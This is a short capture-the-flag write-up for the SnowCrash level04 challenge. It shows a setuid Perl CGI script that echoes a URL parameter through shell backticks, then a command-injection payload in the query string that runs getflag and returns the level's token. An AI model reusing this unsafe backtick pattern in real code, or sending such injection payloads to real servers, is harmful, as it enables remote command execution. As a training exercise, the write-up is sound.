@@ -1,0 +1,30 @@
+< level04@SnowCrash:~$ ls
+> level04.pl
+< level04@SnowCrash:~$ cat level04.pl
+> #!/usr/bin/perl
+> # localhost:4747
+> use CGI qw{param};
+> print "Content-type: text/html\n\n";
+> sub x {
+>   $y = $_[0];
+>   print `echo $y 2>&1`;
+> }
+> x(param("x"));
+> level04@SnowCrash:~$ perl level04.pl
+> Content-type: text/html
+> 
+> 
+< level04@SnowCrash:~$
+# by going to [vm ip]:4747 we can see that a page is running
+# we deduct that use CGI qw{param} gets a parameter from url
+# and that it uses the param named x if present in the subroutine x
+# so we name a param x with a random value and see that it outputs
+# the value in the webpage
+# we see that it actually prints the result of echo with the value of the param x to the echo
+# so we could make it echo the result of a command by prefixing and suffixing the value of x with backquotes
+# so lets use /?x="`/bin/getflag`" since the perl script runs as flag04 as seen below
+< level04@SnowCrash:~$ ls -la level04.pl
+> -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+# so after going to http://192.168.1.83:4747/?x="`/bin/getflag`"
+# the webpage outputs:
+> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
